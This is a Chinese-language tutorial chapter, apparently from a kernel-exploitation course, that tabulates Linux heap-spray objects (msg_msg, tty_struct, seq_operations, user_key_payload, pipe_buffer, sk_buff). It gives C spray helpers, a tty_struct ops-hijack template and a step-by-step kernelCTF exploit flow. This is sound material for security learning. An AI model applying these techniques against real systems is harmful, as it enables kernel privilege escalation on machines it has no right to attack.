# Ch 11 — Heap Spray 物件大全：msg_msg / sk_buff / pipe_buffer / tty_struct / seq_operations / user_key_payload

> 目標：這章是一張查表 — 每個常用 spray object 的 size、怎麼從 user-space 建立 / 釋放、能拿來做什麼（info leak / RIP 控制 / 任意 R/W）。寫 exploit 時翻這章挑工具，不用重新 google。

## 為什麼你需要 spray object

SLUB 上的 UAF / heap overflow 只給你「那個 chunk」的控制權。這個 chunk 本身做不了什麼 — 你要等**某個 kernel 物件**被 alloc 到這個位置，才能透過它發揮。

**spray object** = 可以透過 syscall 大量 alloc 特定 kmalloc-N cache 物件的 kernel 結構。**屬性越「可控」（size、內容、多樣 operation）越有價值**。

每個 spray object 要評三件事：

1. **size / cache**：決定能打哪種 victim cache
2. **content controllability**：多少內容是你 user-space 決定的
3. **operation richness**：有哪些 syscall 可以觸發這個物件的欄位發揮作用

## 速查表

| Object | Cache | Content 可控度 | 觸發點 | 主要用途 |
|---|---|---|---|---|
| `msg_msg` | kmalloc-N（可選） | 高 | msgrcv | info leak, UAF payload |
| `msg_msgseg` | kmalloc-4096 以下可選 | 高 | msgrcv | 長訊息分段 |
| `sk_buff`->data | kmalloc-N（可選） | 中 | recv on socket | data spray |
| `pipe_buffer` | kmalloc-1024 | 中 | splice / pipe | RIP 控制、Dirty Pipe |
| `tty_struct` | kmalloc-1024 | 中高 | open /dev/ptmx | **RIP 控制首選** |
| `seq_operations` | kmalloc-32 | 低 | open /proc/self/stat | **小 size RIP 控制** |
| `user_key_payload` | kmalloc-N | 高 | add_key / keyctl | **任意 size spray 主力** |

下面逐個深入。

## 1. `msg_msg`（任意 size 可選）

**最萬用的 spray object**。System V message queue 的訊息。

```c
#include <sys/msg.h>

struct msgbuf {
    long mtype;
    char mtext[N];   /* N 可以任意大 */
};

int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct msgbuf mbuf = { .mtype = 1 };
memset(mbuf.mtext, 0x41, sizeof(mbuf.mtext));
msgsnd(msqid, &mbuf, sizeof(mbuf.mtext), 0);
```

### 記憶布局

kernel alloc size = `sizeof(struct msg_msg) + payload_len`。

- `sizeof(struct msg_msg)` ≈ 48 byte (不同版本略有差異)
- 總 size 進 `kmalloc-N`：`N = roundup(48 + payload_len)`

**你選 payload_len 就選了 cache**：

- 想打 kmalloc-64：`payload_len = 8..16`
- 想打 kmalloc-128：`payload_len = 80`
- 想打 kmalloc-1024：`payload_len = 976`
- payload > 4096：會拆成 msg_msg header + msg_msgseg 鏈表（next 指標串）

### 可控的內容

msg_msg header 部分（前 48 byte）**不可控**（kernel 填）— 其中 `list_head` 兩個 pointer 很有用來 leak。
payload 部分**完全可控**（user 填什麼是什麼）。

### 怎麼 free

`msgrcv(msqid, buf, len, mtype, 0)` — 把 msg 從 queue pop 出來，kernel free msg_msg。

### 用途

- **info leak**：spray 進 UAF 的 chunk，從 dangling pointer 讀前 48 byte → 拿 list_head 指標
- **UAF payload**：把 payload 設成你要的 fake struct，dangling pointer 讀就是 fake
- **spray padding**：快、量大

### 最小 helper

```c
int make_msg_q(void) {
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

void spray_msg(int msqid, size_t payload_len, int count) {
    struct { long mt; char data[4096]; } *buf = calloc(1, sizeof(*buf));
    buf->mt = 1;
    memset(buf->data, 0x42, payload_len);
    for (int i = 0; i < count; i++)
        msgsnd(msqid, buf, payload_len, 0);
    free(buf);
}
```

## 2. `tty_struct`（kmalloc-1024）

**RIP 控制的首選 victim**。開 `/dev/ptmx` 會 alloc 一個 `tty_struct`：

```c
int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
```

close 就 free。簡單、穩、可控 size 固定。

### 關鍵欄位：`ops`

```c
struct tty_struct {
    int magic;                          /* offset 0 */
    struct kref kref;                   /* offset 4 */
    struct device *dev;                 /* offset 0x10 */
    struct tty_driver *driver;          /* offset 0x18 */
    const struct tty_operations *ops;   /* offset 0x20 */
    int index;
    ...
};
```

`ops` 是一個 struct of function pointers（read、write、ioctl、set_termios...）。覆寫 `ops` 指到 **fake ops**，下次對 fd 做 ioctl kernel 就 call 到你指的函式。

### 利用模板

```c
struct tty_operations fake_ops = {0};
fake_ops.ioctl = (void*)rop_chain_entry;  /* kernel 會 call 這個 */

/* 透過 UAF 覆寫 tty_struct+0x20 = &fake_ops */
uaf_write(victim_addr + 0x20, &fake_ops, 8);

/* 觸發：對原 fd 做 ioctl */
ioctl(tty_fd, 0xdeadbeef, 0);
```

### 限制

- **CFI 開時** ioctl 這個 indirect call 被檢查（Ch 18）
- kernel 新版本 `tty_struct` 的 size 從 1024 變成另一 cache（6.6+ 是 kmalloc-1024，check `pahole`）

## 3. `seq_operations`（kmalloc-32）

**小 size 的 RIP 控制**。`/proc/self/stat` 等 seq_file 介面開啟時 alloc：

```c
int fd = open("/proc/self/stat", O_RDONLY);
```

### 關鍵欄位

```c
struct seq_operations {
    void * (*start)(struct seq_file *m, loff_t *pos);   /* offset 0 */
    void (*stop)(struct seq_file *m, void *v);          /* offset 8 */
    void * (*next)(struct seq_file *m, void *v, loff_t *pos);  /* offset 16 */
    int (*show)(struct seq_file *m, void *v);           /* offset 24 */
};
```

size 剛好 32 byte（4 個 function pointer），進 kmalloc-32。

覆寫 `start` 指到 ROP → 觸發：`read(fd, buf, 1)`。kernel 讀 `/proc/self/stat` 會 call `seq_ops->start()`。

### 用途

kmalloc-32 太小、很少 spray 物件能配到，seq_operations 是少數之一。

## 4. `user_key_payload`（任意 size）

Keyring subsystem 的 payload。**任意 size 可選、內容完全可控**。

```c
#include <keyutils.h>
/* 或直接 syscall: syscall(SYS_add_key, ...) */

char data[SIZE];
memset(data, 0x41, sizeof(data));
key_serial_t key = add_key("user", "name", data, sizeof(data), KEY_SPEC_PROCESS_KEYRING);
```

kernel alloc = `sizeof(struct user_key_payload) + SIZE`。`user_key_payload` header = 24 byte。

### 用途

和 msg_msg 類似但**適用範圍更廣**：

- size 可以是 24..page_size 任意
- 內容 100% 可控（連 header 的某些欄位也是）
- `keyctl_revoke` 可 free

缺點：`commoncap` 對 key 數量有 quota（預設 200 個），大量 spray 會卡。**可用 unshare(CLONE_NEWUSER) 換 namespace 取得新 quota**（這也是 kernelCTF 常見 pre-req）。

### 回讀

`keyctl_read(key, buf, len)` 把 payload 讀回 — info leak 用。

## 5. `pipe_buffer`（kmalloc-1024）

管道內部結構。`pipe()` 建立時 alloc 一個 array of `pipe_buffer`。

```c
int fds[2]; pipe(fds);
```

### 關鍵欄位

```c
struct pipe_buffer {
    struct page *page;                         /* offset 0 */
    unsigned int offset, len;                  /* offset 8, 12 */
    const struct pipe_buf_operations *ops;     /* offset 16 */
    unsigned int flags;
    unsigned long private;
};
```

size ≈ 40 byte per entry × N entries，總包在一個 alloc 裡。預設 pipe 有 16 個 buffer slot，總 alloc ~ 640 byte，進 kmalloc-1024。

### 用途

- **覆寫 `->ops`** → splice 觸發時 call 你的 function → RIP
- **Dirty Pipe** 類（CVE-2022-0847）：透過 flags 欄位繞 permission check，寫只讀檔

## 6. `sk_buff` 的 data（任意 size）

`sk_buff` header 本身在自己的 cache（`skbuff_head_cache`），但 **data part** 是 `kmalloc` 的，size 可選。

```c
int sv[2]; socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
char data[SIZE] = { /* 可控 */ };
write(sv[0], data, SIZE);
/* 這會 alloc sk_buff header + kmalloc(SIZE) 給 data */
```

### 用途

**data spray**。每呼叫一次 write 就 alloc 一個 data buffer，內容完全可控。`read` 取出就 free。

### 計算 size

`alloc_size = SIZE + sizeof(skb_shared_info) + align`，實務上 `SIZE = 512` 進 kmalloc-1024。查 `pahole skb_shared_info` 看你版本的偏移。

## Cache size 對照速查

| 想打 cache | 首選 spray 物件 |
|---|---|
| kmalloc-8 | 難 — `msg_msgseg` 勉強 |
| kmalloc-16 | 難 |
| kmalloc-32 | `seq_operations` |
| kmalloc-64 | `msg_msg` (payload=8-16) |
| kmalloc-96 | `msg_msg`、`user_key_payload` |
| kmalloc-128 | `msg_msg`、`user_key_payload` |
| kmalloc-192 | 同上 |
| kmalloc-256 | 同上、`sk_buff` data |
| kmalloc-512 | 同上、`sk_buff` data |
| kmalloc-1024 | **`tty_struct`**、`pipe_buffer`、`msg_msg`、`user_key_payload`、`sk_buff` |
| kmalloc-2048 | `msg_msg`、`user_key_payload` |
| kmalloc-4096 | 同上、`pipe_buffer` 擴張後 |

## 綜合 exploit pattern

一個典型 kernelCTF 題的 spray 流程：

```
1. unshare namespace 拿足夠 quota
2. pin CPU affinity
3. pre-spray：大量 alloc 填滿當前 slab（msg_msg padding）
4. trigger vulnerable alloc
5. target spray：alloc 少量 victim (tty_struct or user_key_payload)
6. trigger overflow / UAF write
7. check：ioctl 每個 victim fd / read 每個 key，看哪個炸到 payload
8. 拿到 RIP / leak，跳下一階段
```

## 常見踩雷

**`user_key_payload` spray 到一半失敗** — key quota 滿了。事先 `unshare(CLONE_NEWUSER)`、`unshare(CLONE_NEWNS)`。

**msg_msg payload 寫進去了但讀出來內容不對** — msg_msg 的 header 48 byte 會蓋過你 payload 最前面 — 你要從 payload[48:] 之後才是自己寫的內容。

**tty_struct 的 ops 覆寫了但 ioctl 沒 call 到 payload** — CFI（Ch 18）擋了 indirect call，或你 spray 的 1024-byte object 不是 tty_struct 而是另一個同 cache 的東西。

**spray 之後別的 kernel allocation 插進 freelist** — spray 前 pre-spray 一批 padding 把 freelist 拉長、分散。

**msg_msg 佔用了超長 chain (msgseg)**—多的記憶體被鎖住，其他 spray 配不到。注意 payload 大小別過 4096 除非你就要打 msgseg。

## 動手練習

1. **寫 `spray.h`**：把上面每個 spray object 的 helper 寫成一組 C inline functions（`spray_msg`、`spray_tty`、`spray_key`、`spray_pipe`），集中管理。以後 exploit include 這份就行。
2. **測 `msg_msg` 對應 kmalloc-N**：寫程式呼叫 `msgsnd(payload_len=X)` for X in [8, 16, 24, 48, 80, ...]，每次看 `/proc/slabinfo` 哪個 kmalloc-N 的 active_objs 增加 — 驗證 size→cache 的對應。
3. **比較兩個 kmalloc-1024 spray**：同一個 UAF，分別 spray `tty_struct` 與 `msg_msg(payload=976)` 各 100 次，看 dangling read 讀到哪個 — 推測 SLUB 偏好哪個。
4. **實作 user_key_payload 的 namespace 繞 quota**：在 exploit 一開始 `unshare(CLONE_NEWUSER | CLONE_NEWNS)`，驗證 add_key 的 quota 變多。
5. **讀 `ipc/msgutil.c` 的 `load_msg`**：看 msg_msg header 長度、payload 怎麼接、msgseg 怎麼串 — 你之後看 CTF 題的 memory layout 會頻繁回來這裡。

## 自我檢核

- [ ] 能默寫 `msg_msg` / `tty_struct` / `seq_operations` / `user_key_payload` 四個 spray 物件的 size 規則
- [ ] 給任意一個 kmalloc-N size，能說出至少一個該 cache 的 spray 物件
- [ ] 知道 `user_key_payload` 為什麼需要 namespace 處理
- [ ] 能解釋為什麼 `tty_struct` 是 RIP 控制首選（ops 欄位、固定 size、易建易銷）
- [ ] 知道 msg_msg header 48 byte 不可控、payload 完全可控
- [ ] 有一份 `spray.h` 可以重用

下一章把 spray 物件和 overflow / UAF 原語接起來 — 從「我改到了 tty_struct 的 ops」到「拿到 RIP」完整一條鏈。我們詳細打 Ch 5 / 7 的 ROP 出口，讓你第一個 heap exploit 跑得起來。

→ [Ch 12 — 從 heap 到 RIP 控制：tty_struct ops hijack、seq_operations、pt_regs](./12-heap-to-rip.md)
